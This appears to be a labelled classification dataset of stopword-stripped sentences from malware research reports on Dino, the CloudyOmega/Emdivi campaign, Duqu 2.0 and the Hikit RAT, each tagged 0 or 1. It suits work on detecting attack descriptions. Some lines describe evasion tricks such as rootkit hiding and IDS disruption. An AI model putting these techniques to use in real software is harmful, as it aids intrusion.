( United States ) RecId 11173 01 PRS MaxDelay 3600 Version 1.2 OS version ( SP ) 5.1 ( Service Pack 3 ) WOW64 No Default browser firefox.exe IE version Mozilla/4.0 ( compatible; MSIE 7.0; Win32 ) First launch 04/01/2015 – 18:31:14 Time kill N / A Last launch 04/01/2015 – 19:21:44 Mode N / A | Rights Admin | UAC No ID 4635BEF0 D89D 11E4 B283 000C 29FD2872 InstallAv 0 Inj Yes SNOWBALL implant beacon All indicators together make us confident Dino developed Animal Farm group	0
Dino adds least two indicators already documented suggesting Animal Farm developers French speaking	0
Dino 's binary contains resource whose language code value 1036	0
The original purpose language code allow developers provide resources ( menus icons version information … ) different locations world corresponding language	0
Interestingly developer manually specify language code compiler sets language developer 's machine	0
So language corresponds value 1036 0x40c hexadecimal ? French ( France )	0
Of course non French speaking developer could deliberately set value mislead attribution efforts	0
But recent Animal Farm binaries ( example Casper ) language code set classical English ( USA ) language code	0
Therefore seems Animal Farm developers forgot set value first creations realized mistake point decided set standard value	0
Someone using language code false flag would likely kept strategy going	0
For record Dino sample Animal Farm binary 1036 language code	0
Dino 's binary statically linked GnuMP library used manipulate big numbers cryptography algorithms	0
The GnuMP code Dino contains file paths coming developer 's machine	0
As attentive reader probably guessed " arithmetique " French translation " arithmetic "	0
Dino 's binary shows intense development effort custom data structures homemade file system	0
As Animal Farm binaries bears mark professional experienced developers	0
But Dino also shows poor knowledge interest developers anti analysis techniques – contrary seen Casper – demonstrated example verbosity Dino 's log messages	0
All messages provide substantial help understanding Dino 's internal workings	0
One also appreciate numerous misspellings contained messages	0
Regarding Dino 's victims know little except located Iran 2013	0
This accordance victimology described Canada 's CSE presentation	0
That leads us final point blog several signs suggest Dino 's creators French speaking developers	0
These signs add pretty long list indicators already supporting hypothesis particular ones mentioned Canada 's CSE	0
Author Joan Calvet ESET	0
JustSystems issued update Ichitaro product line ( Japanese office suite software ) plugging zero-day vulnerability	0
This vulnerability actively exploited wild specifically target Japanese organizations	0
The exploit sent targeted organizations emails malicious Ichitaro document file attached Symantec products detect Bloodhound.Exploit.557	1
Payloads exploit may include Backdoor.Emdivi Backdoor.Korplug Backdoor.ZXshell ; however payloads aim steal confidential information compromised computer	1
The content emails vary depending business interest targeted recipient 's organization ; however recent political events associated Japan	0
Opening malicious attachment Ichitaro drop payload display document	1
Often exploitation attempts crash relaunch document viewer open clean document order trick users believing legitimate	0
In particular attack opening document dropping payload done without crashing Ichitaro users visual indications really happening background	0
As Security Response previously discussed unpatched vulnerabilities exploited nothing new Ichitaro	0
However investigation Ichitaro zero-day attack discovered attack fact part ongoing cyberespionage campaign specifically targeting various Japanese organizations	0
Symantec named attack campaign CloudyOmega	0
In campaign variants Backdoor.Emdivi persistently used payload	1
All attacks arrive target computers attachment email messages	1
Mostly attachments simple executable format fake icon	1
However files exploit software vulnerabilities aforementioned vulnerability Ichitaro software one	0
This group 's primary goal steal confidential information targeted organizations	1
This blog provides insights history attack campaign infection methods malware payload group carrying attacks	0
The first attack campaign traced back least 2011	0
Figure 1 shows targeted sectors number attacks carried year	0
The perpetrators cautious launching attacks early years attacks beginning earnest 2014	0
By far public sector Japan targeted sector hit Operation CloudyOmega	0
This provides clue attack group	0
Email predominant infection vector used campaign	0
Figure 2 example email used recent attacks prior exploiting Ichitaro zero-day vulnerability	0
The emails include password-protected .zip files containing malware	1
Ironically attackers follow security best practices indicating first email password sent recipient separate email	0
This merely trick recipient believing email legitimate trustworthy source	1
The body email short claims attachment includes medical receipt	0
The email also requests recipient open attachment Windows computer	1
The file attachment Microsoft Word icon indicated within Windows Explorer executable file	0
The malicious payload Backdoor.Emdivi threat opens back door compromised computer	1
The malware exclusively used CloudyOmega attack campaign first appeared 2011 used attack Japanese chemical company	0
Emdivi allows remote attacker executing commands send results back command-and-control ( C & C ) server HTTP	1
Each Emdivi variant unique version number belongs one two types Type S Type T	0
The unique version number clear sign Emdivi systematically managed also acts encryption key	0
The malware adds extra words version number based generates hash uses encryption key	1
Both Emdivi Type S Type T share following functionality Type T primarily used Operation CloudyOmega constant development since campaign first launched 2011 written C++ programing language	0
Type T employs techniques protect security vendors network administrators	1
Important parts Type T C & C server address contacts protection mechanisms encrypted	1
Type T also detects presence automatic analysis systems debuggers following Type S hand used twice attack campaign	1
Type S .NET	1
application based source code shared C & C infrastructure Type T	1
However protection mechanisms encryption essential features threat survival present Type S. One interesting trait Type S uses Japanese sentences seem randomly taken internet change file hash	0
For instance example shown Figure 4 uses sentence talking special theory relativity	0
Once infected Emdivi connects hardcoded C & C servers using HTTP protocol	1
So far total 50 unique domains identified 58 Emdivi variants	0
Almost websites used C & C servers compromised Japanese websites ranging sites belonging small businesses personal blogs	0
We discovered 40 50 compromised websites spread across 13 IP addresses hosted single cloud-hosting service based Japan	0
The compromised sites hosted various pieces web server software Apache Microsoft Internet Information Services ( IIS ) different website platforms	0
This indicates sites compromised vulnerability single software product website platform	0
Instead attacker somehow penetrated cloud service turned websites C & C servers Backdoor.Emdivi	1
The compromised cloud hosting company notified time writing replied	0
Symantec offers two IPS signatures detect block network communication infected computers Emdivi C & C server During research multiple samples related attack campaign identified allowed us connect dots came CloudyOmega 's connections attack groups	0
In August 2012 CloudyOmega attackers exploited zero-day Adobe Flash Player AIR 'copyRawDataTo ( ) ' Integer Overflow Vulnerability ( CVE-2012-5054 ) attack high-profile organization Japan	0
The attackers sent Microsoft Word file containing maliciously crafted SWF file exploited vulnerability	1
Once successfully exploited file installed Backdoor.Emdivi	1
As CVE- 2012-5054 publicly disclosed month attack utilized time zero-day exploit	0
Interestingly Flash file used Emdivi attack 2012 one used LadyBoyle attack 2013 look similar	0
Figure 6 shows malformed SWF file executing LadyBoyle ( ) code attempts exploit Adobe Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability ( CVE-2013-0634 )	0
The Flash file seems created using framework used CloudyOmega group different exploit	0
Both attacks use .doc	0
file containing Adobe Flash zero-day exploit used install back door	1
No evidence connects two different campaigns ; however described previously Symantec Security Response 's Elderwood blog strongly believed single parent organization broken number subgroups target particular industry	0
In terms latest attack Ichitaro collected dozen samples JTD files exactly except payload	0
The parent organization would seem supplied zero-day exploit different subgroups part attack toolkit group launched separate attack using chosen malware	0
This three different payloads ( Backdoor.Emdivi Backdoor.Korplug Backdoor.ZXshell ) observed latest zero-day attack	0
Operation CloudyOmega launched attack group communication channels notorious attack groups including Hidden Lynx group responsible LadyBoyle	0
CloudyOmega operation since 2011 persistent targeting Japanese organizations	0
With latest attack employing zero-day vulnerability indication group stop activities anytime soon	0
Symantec Security Response keeping close eye CloudyOmega group	0
It highly recommended customers using Ichitaro products apply patches soon possible	0
In October 2011 analyzed new threat named Duqu showed close relationships infamous Stuxnet attack	0
By courtesy Kaspersky Lab late May 2015 received samples new threat hint might related Duqu attacks ; however new samples 2014	0
We decided carry individual research samples focus connections original Duqu attack new threat dubbed " Duqu 2.0 "	0
After analyzing samples received think adversaries behind Duqu malware back active ; modified tools undetected old methods also strongly reused codes ideas recent attacks	0
The numerous similarities discovered Duqu Duqu 2.0 include following	0
In report present supporting details analysis similarities listed	0
Stuxnet probably well - known malware times	0
Its fame stems facts targeted specific industrial facility namely uranium enrichment plant Iran aimed physical destruction uranium centrifuges apparently accomplished mission successfully	0
In addition characteristics IT security experts also appreciate technical sophistication zero - day exploits used	0
Stuxnet also alarm developed world shed light capabilities advanced attackers time numerous weaknesses computing infrastructure	0
Putting two together people started feel hopelessly vulnerable	0
Yet unfortunately Stuxnet unique example highly sophisticated targeted threat numerous pieces malware similar kind including Duqu Flame Regin etc	0
Among Duqu particularly interesting discovered back 2011 analysis pointed - Duqu 's objective different - strong similarities Stuxnet terms architecture code methods achieve stealthiness	0
Today widely believed within IT security community Duqu created attackers created Stuxnet	0
And new member family Last month received interesting samples Kaspersky Lab hint might related Duqu samples 2011 ; however new samples 2014	0
Our common understanding would interesting figure whether new threat indeed related old Duqu attack CrySyS Lab try focus analysis efforts answering question	0
It important emphasize analysis independently Kaspersky Lab read preliminary report share findings us ( apart samples received )	0
The analysis results performed Kaspersky Lab read following report	0
https://securelist.com / blog / research/70504/the - mystery - - duqu- 2 - 0-a - sophisticated - cyberespionage - actor - returns/ In report present results comparative analysis old version Duqu new version codenamed " Duqu 2.0 "	0
We concentrate description relevant similarities differences found two malware samples	0
In table one see MD5 fingerprints two samples examined initial analysis	0
The first module referenced document name " c7c647 " second name " 3f52ea " according prefix MD5 hashes	0
In following chapter discuss conspicuous similarities differences found main modules Duqu Duqu 2.0	0
Both two main modules Duqu 2.0 analyzed ( " c7c647 " " 3f52ea " ) 6 export functions seen following figure	0
The new sample ( versions ) one big executable file linked multiple modules	0
The original Duqu main module divided two sub - modules outside layer internal part	0
In one version internal part stored specific compressed format another version investigated Duqu victim stored cleartext resource data section main executable	0
The Duqu 2.0 version investigated different everything incorporated main executable still visible marks showing malware linked / compiled multiple different parts modules	0
Some strings Duqu 2.0 obfuscated XOR - based encryption	1
The actual routine used printed	0
The decompiled version assembly code seen following sample	0
The string decryptor routine simple XOR decoder	0
It simply XORs consecutive 4-byte blocks encrypted string buffer given pointer first parameter function fixed 4-byte key ( " 0x86F186F1 " )	0
After decryption consecutive 4- byte blocks actual cleartext block stored within next 4 bytes output buffer pointed parameter " a2 "	0
The decrypted ( cleartext ) string terminated " \0 " character decryptor cycle reaches end ( cleartext ) string cleartext string pointed address stored output argument " a2 "	0
A closer look C code reveals string decryptor routine actually two parameters " encrstr " " a2 "	0
First decryptor function checks input buffer ( pointer encrypted string ) points valid memory area ( i.e. contain NULL value )	0
After first 4 bytes encrypted string buffer XORed key " 0x86F186F1 " result XOR operation stored variable " result "	0
The first DWORD ( first 4 bytes ) output buffer a2 populated resulting value ( * ( _ DWORD * ) a2 = result ; )	0
Therefore first 4 bytes output buffer contain first 4 bytes cleartext string	0
If first two bytes ( first WORD ) current value stored variable " result " contain ' \0 ' characters original cleartext string empty string resulting output buffer populated zero value stored 2 bytes	0
If first half actual decrypted block ( " result " variable ) contains something else decryptor routine checks second half block ( " ( * ( _ WORD * ) ( a2 + 2 ) ) ")	0
If WORD value NULL decryption ended output buffer contain one Unicode character two closing ' \0 ' bytes	0
If first decrypted block doens't contain zero character ( generally case ) decryption cycle continues next 4-byte encrypted block	0
The pointer output buffer incremeted 4 bytes able store next cleartext block ( " a2 + = 4 ; " )	0
After following 4-byte block " ciphertext " decrypted fixed decryption key ( " 0x86F186F1 " )	0
The result stored within next 4 bytes output buffer	0
Now output buffer contains 2 blocks cleartext string	0
The condition cycle checks decryption reached end checking first half current decrypted block	0
If reached end cycle continues decryption next input blocks described	0
Before decryption 4-byte " ciphertext " block routine also checks second half previous cleartext block decide whether decoded string ended	0
The original Duqu used similar string decryption routine printed following figure	0
We see routine exact copy previously discussed routine ( variable " a1 " analogous " encrstr " argument )	0
The difference Duqu 2.0 Duqu string decryptor routines XOR keys differ ( Duqu key is"0xB31FB31F " )	0
We also see decompiled code Duqu contains decryptor routine compact manner ( within " " loop instead " " ) two routines essentially	0
For example two boundary checks Duqu 2.0 routine ( " ( * ( _ WORD * ) ( a2 + 2 ) ) " " ( ( _ WORD)result ) ; " ) analogous boundary check end " " loop Duqu routine ( " ( ( _ WORD)v4 || * ( _ WORD * ) ( result + 2 ) ) ")	0
Similarly increment operation within head loop Duqu sample ( " result + = 4 " ) analogous increment operation " a2 + = 4 ; " Duqu 2.0 sample	0
The analyzed main module Duqu 2.0 also old Duqu sample reads configuration information special file	1
This configuration file encrypted using AES block cipher CBC mode CTS - like ( Ciphertext Stealing ) encryption last two cleartext blocks	0
The format configuration file discussed details next chapter	0
Before encryption configuration file AES wrapper object created	0
This C++ object represents context ( parameters ) encryption	0
Therefore also stores initialization vector ( IV ) encryption key cipher data encrypted	0
The structure object 's class seen upper part next screenshot	0
As see allocated memory area instance " aeswrapper " structure ( class ) starts 16 bytes ( 128 bits ) IV value ( course size IV equals size AES input block )	0
It followed 516-byte buffer ( unused smaller attributes ) store encryption key AES cipher	0
Size encryption key either 128 192 256 bits ( 16 24 32 bytes )	0
The last 4 bytes " aeswrapper " structure contains pointer data encrypted	0
In addition attributes ( IV encryption key pointer data buffer ) " aeswrapper " class also contains methods	0
The important methods " encrypt " " initialize " functions	0
As name shows initialize method initializes context ( parameters ) encryption therefore sets IV key data members " aeswrapper " object	0
The IV generated " hand " key prepared initial key using prepare_key function	0
The encrypt method encrypts data modified CBC - CTS- like mode	0
The method uses AES encryptor function	0
The nth_block method class gives back pointer n - th block data encrypted	0
Finally " aeswrapper " class uses last_block function perform CTS - like encryption mechanism end	0
The function gives back pointer last partial ( smaller 16 bytes ) input block last 16 bytes input data buffer	0
The implementation AES prepare_key encrypt methods presumably copied function libraries	0
The figure shows structures ( structures class instances ) identified related encryption routine AES initialization putative attributes structures ( classes )	0
Using structures disassembled code readable	0
There another structure addition " aeswrapper " class called " aes " screenshot	0
An instance class represents AES encryptor object	0
It probably 3 attributes key_schedule precomputed iteration_count	0
In following table see AES initialization routine ( configuration file encryption ) old Duqu ( left ) new Duqu 2.0 sample ( right ) assembly code level	0
The decompiled code initialization function ( malware samples ) seen figure Sample 6	0
The AES initialization function initializes mentioned " aeswrapper " object sets data buffer prepares encryption key finally generates IV based magic constant	0
Duqu " netp " routine Duqu 2.0 " c7c64 " routine In cases highlighted part assembly code corresponds highlighted part initialization routines decompiled versions code seen figure Sample 6	0
The difference highlighted parts values magic constants ( " 0xDEADBABE " vs.	0
" 0x248561EF " ) used generation 128-bit initialization vectors	0
The mentioned AES initialization routines ( also common encryption function ) discussed later section details	0
We also reverse engineered encryption routine used Duqu 2.0 illustrated following block diagram	0
With exception last two input blocks consecutive blocks cleartext data encrypted AES encryption algorithm CBC mode	0
Accordingly first block input data ( " P[0 ] " ) XORed fixed initialization vector ( named " Fixed IV " figure )	0
This 128-bit initialization vector ( IV ) differs old Duqu new Duqu 2.0 samples	0
The value IV generated magic constant seen highlighted parts previous assembly code	0
As magic constant different old new samples generated IV also different	0
The result previously mentioned XOR operation gives first input block AES encryption algorithm ( " AES-256 " use )	0
The number 256 means AES algorithm 256-bit key size	0
The block size AES cipher constant 128 bits ( 16 bytes )	0
" E[0 ] " first output block cipher first encrypted block ( " F[0 ] " )	0
Output block cipher ( " E[0 ] " ) XORed second input block ( " P[1 ] " ) resulting block encrypted AES-256	0
This procedure continues encryption last first block cleartext data	0
If size input data integer multiple block size AES ( i.e. 128 bits ) remaining last two blocks cleartext encrypted manner previous input blocks	0
So case whole encryption routine matches simple CBC mode encryption	0
However size input data exact multiple AES block size last partial block input data needs padding completed full block	0
In case Duqu 2.0 developers malware n't use padding traditional way	0
Instead use CTS - like ( Ciphertext Stealing ) method	0
The essence method used encryption routine part last first block input data encrypted twice using AES	0
The last first block ( " P[n-1 ] " ) cleartext data XORed previous ciphertext block ( " E[n-2 ] " ) encrypted AES-256 previously	0
The result operation " E[n-1 ] " output block	0
The " E[n-1 ] " output block wo n't directly used ( n-1)st ciphertext block	0
Instead output " E[n-1 ] " splitted two distinct parts " F[n-1 ] " another part fed AES encryptor	0
The last cleartext partial block ( " P[n ] " ) – size less 16 bytes – completed beginning get full AES input block	0
The data used completing last partial block taken end previous AES output block ( " E[n-1 ] " )	0
The resulting block fed AES-256 cipher last step encryption process	0
The output last invocation AES cipher last ciphertext block ( " F[n ] " )	0
The output last first invocation AES encryptor ( " E[n-1 ] " ) split two parts first part size size_of_the_last_cleartext_block ( n-1)st ciphertext block ( " F[n- 1 ] " )	0
The old Duqu samples used exactly encryption method	0
The decompiled code AES encryptor Duqu seen following sample one see code implements method explained illustrated block diagram Figure 8	0
The next table compares AES initialization routines old Duqu sample ( upper part table ) main module Duqu 2.0 ( lower part table )	0
First initialization routine copies pointer input data buffer " data " member " aeswrapper " object	0
The routine takes pointer second parameter	0
The first parameter pointer ( reference ) object instance since C++ first ( hidden ) parameter ( non - static ) class method always pointer object words " " pointer	0
In case Duqu 2.0 routine third parameter pointer buffer containing key	0
After content " key " buffer ( global buffer first case ) copied local " key _ " buffer cases	0
Then prepare_key method AES object prepares final encryption key based key feeds " aeswrapper " object	0
Invocation prepare_key method also seen assembly view ( see Sample 4 ) method referred name AES1_sub_2F9B1 case Duqu AES_1_sub_1001690A case Duqu 2.0	0
In Duqu 2.0 case function one parameter also seen assembly view length AES key chosen 256 bits	0
Finally remaining part code initializes IV member " aeswrapper " object	0
Every byte IV generated XORing index actual byte magic constant ( " 0xDEADBABE " " 0x248561EF " respectively two cases )	0
Byte index starts zero	0
As see three small differences routines magic constants used IV generation fact Duqu key constant global variable fixed value Duqu 2.0 argument initialization function finally possible length key	0
In case Duqu prepare_key function assumes key always 256 bits case Duqu 2.0 prepare_key function takes key length argument	0
Key length 128 192 256 bits	0
Under encryption layer ( identical new old samples described previous section ) configuration file format new Duqu 2.0 samples similar old Duqu config file format	0
For overview see Figure 5	0
The format designed hold key - value pairs	0
The keys always 4-byte long values arbitrary size	0
We believe keys timestamps values configuration entries although file format could hold similarly structured information ( e.g.	0
configurations )	0
The old file format begins 4 bytes whose value undefined	0
In serialization process read uninitialized buffer ignored deserialization process	0
The new file format beginning byte sequence	0
The main part file format surrounded 4 signature bytes beginning end	0
The byte sequence old Duqu file format 0x839172FF new Duqu 2.0 version 0x7749CB4D.	0
In cases next integer indicates number entries followed entries	0
Each entry begins 4-byte key value	0
In new format value always begins 13 bytes ( logically divided four 4 byte integers 1 byte value 4 + 4 + 1 + 4 + 4 ) old format missing	0
Furthermore value contains variable size part formats	0
This length prefixed buffer hold arbitrary data	0
In essence difference Duqu Duqu 2.0 config file formats presence undefined 4 bytes beginning file old version presence 13 additional value bytes new version	0
We 've identified characteristic logging function present Duqu Duqu 2.0 used extensively networking ( mainly HTTP handling ) part code	1
The logging function identical data structure used storing log entries similar	0
The Duqu version data structure embedded function pointers Duqu 2.0 version uses virtual function table like structure	0
The main difference C++ virtual function table pointer table last field associated structure instead first field ( see Figure 6 )	0
In general change coding style seen code	0
While Duqu uses object oriented style similar identical C++ compilers Duqu 2.0 moved mainly " real " C++ still deviations standard C++ style ( like previously function table )	0
Both Duqu Duqu 2.0 avoids storing messages logged function	0
In codebase " handle_log_entry " function called creating log entry structure function throws object away ( frees memory ) print save	0
The authors probably used C / C++ macros avoid detailed logging release builds case still see logging function invocation	0
In case macro probably placed function printed log message ( handle_log_entry ) since virtual function compiler could optimize function invocations directly	0
The logging function called equal times Duqu Duqu 2.0 samples invocation always similar ( see Figure 7 )	0
The arguments usually strings describing event directly 4 byte magic numbers	0
The logging function invoked equal times magic numbers almost always identical Duqu Duqu 2.0	0
The network communication methods used Duqu 2.0 described following list	0
SocketServer1	0
In export function nr1 config " startSockServer " parameter set start server accordingly SocketServer2	0
Binds ports 17000 17100 configured client server GifServer	0
With Custom HTTP Server implementation possibly based SocketServer2 PipeComm	0
PIPE IPC communication customizable network communication HttpClient	0
WinHTTP - based simple client uses " COUNTRY= " cookie parameters ( standard HTTP client ) Duqu used unique user agent string communicating HTTP	0
Mozilla/5.0 ( Windows ; U ; Windows NT 6.0 ; en - US ; rv:1.9.2.9 ) In contrast Duqu 2.0 chooses user agent string randomly large set often used values listed Sample 7	0
The following list shows browser agent strings found Duqu 2.0	0
Duqu 2.0 uses one method import functions DLLs	0
One methods utilizes hash method represent function names 4 byte integers	0
It iterates importable function finds one whose function name hash matches given hash	0
This hash function uses magic number	0
A similar import method hash function used Duqu Duqu 2.0 although magic numbers different 0x86F186F1 0xB31FB31F.	0
Note even inner structure magic numbers similar ( 2x2 bytes )	0
The malware transmit information HTTP traffic	1
It likely one infected computers proxy points towards attacker meaning infected computers communicate proxies	1
These proxies act HTTP HTTPS servers	1
For HTTPS self signed certificate created malware	0
( Most likely contacting gpl3.selfsigned.org )	0
The Common Name ( CN ) field seems " * " created certificate	0
During data transfer malware uses 5 random numbers>.gif file name 843-byte GIF file + additional random bytes	0
The transmissions may protected AES	0
One possible way detect transmission ( cleartext traffic somehow available ) detect actual 843-byte GIF file	0
For known two samples GIF portion identical	0
The actual image hex dump following	0
The image small picture basic color yellow orange dots	0
For main binary malware propose following rules detection	0
We 've made initial analysis prove claims strong connection Duqu Duqu 2.0 malwares	0
Our main goal highlight striking similarities differences samples	0
Similarities shows developers Duqu 2.0 reused code basis old Duqu specimens differences found binaries indicates developers Duqu modified tools avoid detections	0
[ CrySySDuqu ] CrySyS Duqu A Stuxnet - like malware found wild v0.93 ( 14/Oct/2011 ) http://www.crysys.hu/publications/files/bencsathPBF11duqu.pdf [ SymantecDuqu ] Symantec W32.Duqu The precursor next Stuxnet Version 1.4 ( November 23 2011 ) http://www.symantec.com/content/en/us/enterprise/media/security_response/white papers / w32_duqu_the_precursor_to_the_next_stuxnet.pdf [ KasperskyDuqu ] Kaspersky Lab Duqu Steal Everything Kaspersky Lab 's investigation - " The Mystery Duqu " blogs http://www.kaspersky.com/about/press/major_malware_outbreaks/duqu [ SymantecDossier ] Symantec W32.Stuxnet Dossier Version 1.4 ( February 2011 ) http://www.symantec.com/content/en/us/enterprise/media/security_response/white papers / w32_stuxnet_dossier.pdf [ KasperskyDuqu2.0 ] Kaspersky Lab The Duqu 2.0 Technical Details Version 1.9.8 ( 2.June.2015 ) https://securelist.com / blog / research/70504/the - mystery - - duqu-2 - 0-a - sophisticated- cyberespionage - actor - returns/ Questions comments welcome	0
The corresponding author Dr.	0
Boldizs r Bencs th bencsath@crysys.hu Laboratory Cryptography System Security CrySyS – http://www.crysys.hu/ Budapest University Technology Economics Department Telecommunications 1117 Magyar Tud sok Krt	0
2	0
Budapest Hungary GPG BENCSATH Boldizsar boldi@crysys.hu Key ID 0x64CF6EFB Fingerprint 286C A586 6311 36B3 2F94 B905 AFB7 C688 64CF 6EFB	0
Hikit consists least two generations malware provides basic RAT functionality	1
The first generation Hikit ( referred '' Gen 1 '' ) operates server requires externally exposed network interface order attacker access victim machine	1
The second generation Hikit ( referred '' Gen 2 '' ) uses traditional client model beacons attacker 's C2 server	1
While communication models shifted dramatically Gen 1 Gen 2 generations Hikit retain basic RAT function consisting remote command shell file management network proxy port forwarding	1
Both Gen 1 Gen 2 sub-families Hikit consist main DLL ( referred '' DLL '' ) contains RAT functionality ; kernel driver ( referred '' Driver '' ) Gen 2 also employs additional component loader executable	1
The driver component Gen 1 Gen 2 drastically different operation intent	0
For Gen 1 sub-family Hikit driver acts NDIS ( network ) driver responsible interfacing DLL network preventing direct WinSock interface occurring	0
The Gen 1 Driver listens network traffic arriving local network interface waits specific trigger string	1
The trigger string varies Driver DLL sample	0
The Gen 2 Driver simpler system driver acts rootkit hide processes registry keys network connections associated Gen 2 activity victim 's system	1
Gen 2 uses standard client-server malware model meaning malware longer requires direct Internet-facing network card longer uses network driver networking provides ability network multiple Gen 2 samples behind firewall greater ease ( attacker's perspective )	0
The Gen 2 sub-family however longer employs network stealth provided Gen 1 network driver exposes C2 server addresses analysts	0
Each Hikit generations contains multiple sub-generations author ( ) Hikit evolved code time	0
There noticeable steep improvement code base Gen 1 Hikit family 2011 development period	0
The Gen 2 sub-generations share similar improvement scale late 2011 late 2013	0
The earliest known Hikit sample dates back 31 March 2011	0
Known Gen 1.0 sub-generation Hikit Gen 1 first known sample Hikit deviated later traditional Gen 1 model	0
The Gen 1.0 sample standalone executable whereas subsequent Gen 1 sub-generations use DLL running service	0
The Gen 1.0 sample clearly work-in-progress	0
The Gen 1.0 sample different subsequent sub-generations still rely Driver component part structure code differ much going forward Gen 1 evolution	0
Less three weeks Gen 1.0 author ( ) Hikit move Gen 1.1	0
The notable change Hikit model using DLL driver remained present day comes	0
The code matures slightly Gen 1.0 Gen 1.1 functionality change	0
Both Gen 1.0 Gen 1.1 use plaintext data transmissions	0
Development appears halt Gen 1 4 months 20 June 2011 23 October 2011 based lack available samples found	0
During time development Hikit appears change locations	0
Gen 1 samples Program Database ( PDB ) file strings identify file path Hikit source code	0
For Gen 1.0 Gen 1.1 samples file path Hikit source code consistently h \JmVodServer\hikit	0
Starting Gen 1.2 file path switches e \SourceCode\hikitnew	0
It time functionality Hikit Gen 1 begins mature	0
In Gen 1.2 communication infected machine attacker encrypted using XOR mask	1
A subtle change renaming '' socks5 '' command simply '' proxy '' within code	0
The code within Hikit begins mature overall functionality expand beyond original set commands found Gen 1.0	0
The remarkable change within Gen 1.1 Gen 1.2 development way session handshake trigger operates	0
In Gen 1.0 Gen 1.1 DLL instructs Driver listen specific string ( typically HTTP request string ) responds another string	0
In Gen 1.2 Driver hardcoded trigger string ( specific HTTP request string ) DLL instructs Driver inspect specific HTTP header field specific hexadecimal value	0
This moves Gen 1.2 username/password authentication scheme whereas previous sub-generations could potentially accessed accidental HTTP requests	0
At time Driver responds specific value Etag HTTP header field	0
This places Gen 1.2 stealth position random non-HTTP compliant response Gen 1.0 Gen 1.1 samples obvious legitimate HTTP response specially crafted Etag header	0
Gen 1.2 's development cycle appears exist 23 October 2011 2 November 2011 several new samples found Internet legitimate compile times time window	0
There however evidence development Hikit Gen 1 Gen 2 overlap several months	0
The earliest Gen 2 sample known exist dates 28 August 2011 two months first known Gen 1.2 sample	0
The last known Gen 1.2 sample extension last known Gen 1 sample dates 9 April 2012	0
The first known Gen 2 sub-generation Gen 2.0 Alpha much like Gen 1.0 represents early development version Gen 2 Hikit sub-family	0
Gen 2.0 Alpha stand-alone Windows console executable run service executable	0
Gen 2.0 Alpha supports commands Gen 1.2 additional command returns infection 's configuration information	0
On 9 February 2012 first known sample Gen 2.0 Beta compiled developer ( ) Hikit	0
Also stand-alone console executable like Gen 2.0 Alpha Gen 2.0 Beta code changes internally without providing significant functionality improvements exception executable uses device driver hide network file registry artifacts related operation	0
Both Gen 2.0 Alpha Gen 2.0 Beta still retain PDB file path information within binaries	0
During development phase Gen 2.0 Alpha development Gen 2.0 Alpha variants changes locations	0
First version Gen 2.0 Alpha malware 28 August 2011 PDB path located H \JmVodServer\Matrixnew2 whereas file path later Gen 2.0 Alpha Gen 2.0 Beta binaries PDB path E \SourceCode\Matrixnew suggests source code Gen 1 Gen 2 existed machine moved roughly time	0
This may indicate either single developer team ( set teams ) shared resources	0
The first known Gen 2.1 binary compile date 17 April 2012	0
Gen 2.1 represents first Gen 2 sub-generation use executable-based loader DLL driver model model subsequent Gen 2 sub-generations employ	0
The functionality Gen 2.1 sub-generation previous generations new commands introduced	0
Gen 2.1 first sub-generation Gen 2 sub-family introduce 64-bit binaries	0
The Gen 2.2 sub-generation appears begun 20 July 2012	0
Gen 2.2 notable altering configuration information RAT stored using DLL-based executable- based loaders	0
Also notable fact sub-generation spans significant amount time intermittent periods development	0
The bulk Gen 2.2 samples tell-tale marks product builder compile date 26 July 2013 full year first known Gen 2.2 sample	0
Between 21 July 2012 20 February 2013 known Gen 2.2 binaries	0
The two 20 July 2012 samples different compile times indicating product builder rather unique compilations	0
Between 21 February 2013 27 February 2013 4 unique compilation dates DLL component 7 unique known Gen 2.2 DLLs	0
The bulk Gen 2.2 samples compile date 26 July 2013	0
There approximately 25 known Gen 2.2 DLLs 26 July 2013 compile date	0
The Gen 2.2 sub-generation appears exist least 19 September 2013	0
The last known Gen 2 sub-generation Gen 2.3 began 12 December 2013	0
Gen 2.3 notable use legitimate SSL certificate part handshake infected machine attacker 's C2	0
The DLL send legitimate SSL certificate means disrupt heuristic IDS sensors look encrypted traffic	1
Another interesting aspect Gen 2.3 sub-generation longer marker designate beginning embedded configuration	0
Gen 2.1 Gen 2.2 uses specific string indicate beginning embedded configuration presumably order allow builder locate configuration space constructing new configuration binaries	0
Gen 2.3 however uses specific location instead requiring builder calculate specific location using PE/COFF header binary	0
Also Gen 2.1 Gen 2.2 retain configuration within DLL component Gen 2.3 stores configuration within loader component	0
This allows attackers configure loader without update DLL	0
The evolution Hikit long drawn series small incremental development changes	0
The important take away evolution Hikit developers Gen 1 appear changed late 2011 development Gen 2 several month overlap development usage Gen 1	0
The following table provides quick reference generational ( sub-generational ) designations Hikit	0
The Driver component Hikit varies based specific Hikit sub-family ( Gen 1 Gen 2 )	0
As necessary describe context specific sub-family	0
The Driver component Gen 1 Hikit variants provides interface victim 's network interface card ( NIC ) DLL	0
The Driver NDIS ( network ) driver integrates victim's network stack	0
The Driver intercepts network communication traverses Windows network stack potentially removes data network stack specific conditions	1
When Driver removes data network stack Driver stores removed data local buffers Gen 1 DLL query	0
The purpose behavior allow DLL interact network without utilizes WinSock API could potentially reveal presence Hikit	1
In order interact Driver DLL uses function The Driver remove data network stack new channel established	0
A new channel occurs Driver detects trigger string	0
The trigger string typically short form HTTP request following trigger strings found wild Up including Gen 1.1 Drivers required DLL specify trigger string addition authentication value whereas Gen 1.2 Drivers trigger strings hardcoded	0
In Gen 1.2 whenever Driver detects trigger string Driver inspects rest data received authentication value	0
If token follows trigger string ( specific limitation far trigger string password token must ) Driver generates new channel DLL use conduit DLL client	0
The Driver appears based NDIS example source code PassThru	0
More specifically author ( ) Driver appear used modified version PassThru example PassThruEx James Antognini Thomas Devine 2003 blog post	0
The Gen 2 sub-family beginning Gen 2.0 Beta employs Windows device driver ( '' Driver '' ) hide aspects DLL 's functionality normal system processes	1
The Driver relatively straightforward piece software	0
It attempt obfuscate functionality static analysis hooks minimum number kernel API functions order hide different pieces information	1
The Driver based primarily open source Agony rootkit evidence portions code coming directly Chinese blog	0
The Driver expose IOCTL interface supports following OIDs The Driver capable hiding processes ( PID name ) system modules services network connections listening ports directories ( extension files ) well registry keys values	1
In order hide items Driver hooks various Windows Kernel API calls	1
The following table maps items Driver hide API function Driver hooks In order hide services Driver access memory services.exe process locate linked list services remove service entry Driver wishes hide	1
This surprisingly invasive method obfuscate process	1
